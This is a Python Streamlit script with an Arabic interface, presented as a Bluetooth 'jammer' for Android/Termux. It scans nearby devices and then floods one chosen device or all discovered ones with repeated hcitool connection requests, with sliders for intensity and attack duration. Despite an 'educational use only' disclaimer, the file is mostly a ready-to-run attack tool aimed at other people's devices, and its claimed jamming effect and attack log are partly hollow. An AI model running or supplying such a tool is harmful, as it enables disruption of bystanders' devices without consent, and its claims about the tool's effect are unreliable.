#!/usr/bin/env python3
# أداة Jammer بلوتوث - تعمل على أندرويد (Termux)
# لا تحتاج إلى وضع مراقبة
# التشغيل: streamlit run bluetooth_jammer.py

import streamlit as st
import subprocess
import os
import time
import threading
import re

# إعداد الصفحة
st.set_page_config(
    page_title="Bluetooth Jammer - منارة نونو",
    page_icon="📡",
    layout="centered"
)

st.markdown("# 📡 Bluetooth Jammer")
st.markdown("### تشويش وإغراق أجهزة البلوتوث")
st.markdown("---")

st.warning("⚠️ هذا للاستخدام التعليمي فقط. تحقق من القوانين المحلية.")

# ============================================================
# حالة الجلسة
# ============================================================
if 'jamming' not in st.session_state:
    st.session_state.jamming = False
if 'devices' not in st.session_state:
    st.session_state.devices = []

# ============================================================
# وظائف المساعدة
# ============================================================
def scan_bluetooth():
    """مسح أجهزة البلوتوث القريبة"""
    try:
        result = subprocess.run(
            ["hcitool", "scan"],
            capture_output=True,
            text=True,
            timeout=10
        )
        lines = result.stdout.splitlines()
        devices = []
        for line in lines[1:]:  # تخطي العنوان
            if line.strip():
                parts = line.split()
                if len(parts) >= 2:
                    mac = parts[0]
                    name = " ".join(parts[1:])
                    devices.append({"mac": mac, "name": name})
        return devices
    except Exception as e:
        return []

def jam_device(mac):
    """تشويش على جهاز بلوتوث محدد"""
    try:
        # إغراق الجهاز بطلبات اتصال
        for i in range(10):
            subprocess.run(
                ["hcitool", "cc", mac],
                capture_output=True,
                timeout=1
            )
            time.sleep(0.1)
        return True
    except:
        return False

def mass_jam(devices):
    """تشويش على جميع الأجهزة المكتشفة"""
    for device in devices:
        jam_device(device["mac"])
        time.sleep(0.2)

# ============================================================
# الواجهة الرئيسية
# ============================================================

# ============================================================
# 1. مسح الأجهزة
# ============================================================
st.markdown("### 📱 مسح الأجهزة القريبة")

if st.button("🔍 مسح البلوتوث", use_container_width=True):
    with st.spinner("⏳ جاري المسح..."):
        devices = scan_bluetooth()
        if devices:
            st.session_state.devices = devices
            st.success(f"✅ تم العثور على {len(devices)} جهاز")
        else:
            st.warning("❌ لم يتم العثور على أجهزة. تأكد من تشغيل البلوتوث.")

# عرض الأجهزة المكتشفة
if st.session_state.devices:
    st.markdown("#### الأجهزة المكتشفة:")
    device_data = []
    for i, device in enumerate(st.session_state.devices):
        device_data.append({
            "رقم": i + 1,
            "الاسم": device["name"],
            "MAC": device["mac"]
        })
    st.dataframe(device_data, use_container_width=True)

# ============================================================
# 2. اختيار الهدف
# ============================================================
st.markdown("---")
st.markdown("### 🎯 اختيار الهدف")

target_option = st.radio(
    "اختر نوع الهجوم:",
    ["جهاز محدد", "جميع الأجهزة"]
)

target_mac = None
if target_option == "جهاز محدد":
    if st.session_state.devices:
        device_names = [f"{d['name']} ({d['mac']})" for d in st.session_state.devices]
        selected = st.selectbox("اختر الجهاز:", device_names)
        if selected:
            target_mac = selected.split("(")[-1].replace(")", "")
    else:
        st.warning("⚠️ لا توجد أجهزة مكتشفة. قم بالمسح أولاً.")

# ============================================================
# 3. إعدادات التشويش
# ============================================================
st.markdown("---")
st.markdown("### ⚙️ إعدادات التشويش")

col1, col2 = st.columns(2)
with col1:
    intensity = st.slider(
        "شدة التشويش:",
        min_value=1,
        max_value=10,
        value=5,
        help="كلما زادت الشدة، زادت الطلبات المرسلة"
    )
with col2:
    duration = st.slider(
        "مدة الهجوم (ثواني):",
        min_value=5,
        max_value=120,
        value=30
    )

# ============================================================
# 4. زر الهجوم
# ============================================================
st.markdown("---")
col1, col2, col3 = st.columns(3)

with col1:
    if st.button("🚀 بدء الهجوم", use_container_width=True):
        if not st.session_state.devices:
            st.error("❌ لا توجد أجهزة للهجوم. قم بالمسح أولاً.")
        elif target_option == "جهاز محدد" and not target_mac:
            st.error("❌ يرجى اختيار جهاز.")
        else:
            st.session_state.jamming = True
            
            # تنفيذ الهجوم
            st.info(f"⏳ جاري تشويش الأجهزة لمدة {duration} ثانية...")
            
            progress_bar = st.progress(0)
            status_text = st.empty()
            
            # حساب عدد التكرارات
            total_cycles = duration // 2
            
            for i in range(total_cycles):
                if not st.session_state.jamming:
                    break
                    
                progress = (i + 1) / total_cycles
                progress_bar.progress(progress)
                status_text.text(f"⏳ دورة {i+1}/{total_cycles}")
                
                if target_option == "جهاز محدد":
                    # تشويش جهاز واحد
                    success = jam_device(target_mac)
                    status = "✅ نجح" if success else "❌ فشل"
                    status_text.text(f"{status} - تشويش على {target_mac}")
                else:
                    # تشويش جميع الأجهزة
                    mass_jam(st.session_state.devices)
                    status_text.text(f"✅ تشويش على {len(st.session_state.devices)} جهاز")
                
                time.sleep(2)
            
            progress_bar.progress(1.0)
            status_text.text("✅ تم الانتهاء من الهجوم")
            st.session_state.jamming = False
            st.success("✅ اكتمل الهجوم بنجاح")

with col2:
    if st.button("🛑 إيقاف الهجوم", use_container_width=True):
        st.session_state.jamming = False
        st.warning("⏹️ تم إيقاف الهجوم")

with col3:
    if st.button("🧹 مسح الأجهزة", use_container_width=True):
        st.session_state.devices = []
        st.success("✅ تم مسح الأجهزة")

# ============================================================
# 5. سجل الهجوم
# ============================================================
st.markdown("---")
st.markdown("### 📋 سجل الهجوم")

if 'log' not in st.session_state:
    st.session_state.log = []

if st.session_state.jamming:
    st.info("🔄 الهجوم قيد التنفيذ...")

if st.session_state.log:
    for entry in st.session_state.log[-10:]:
        st.text(entry)
else:
    st.info("لا يوجد سجل بعد")

# ============================================================
# التذييل
# ============================================================
st.markdown("---")
st.markdown("⚠️ **ملاحظات مهمة:**")
st.markdown("1. هذه الأداة تعمل فقط على الأجهزة القريبة")
st.markdown("2. تأكد من تشغيل البلوتوث على هاتفك")
st.markdown("3. قد لا تعمل على بعض الأجهزة بسبب إعدادات الأمان")
st.markdown("4. للاستخدام التعليمي فقط")

st.markdown("made by @cheifbreef on discord :)")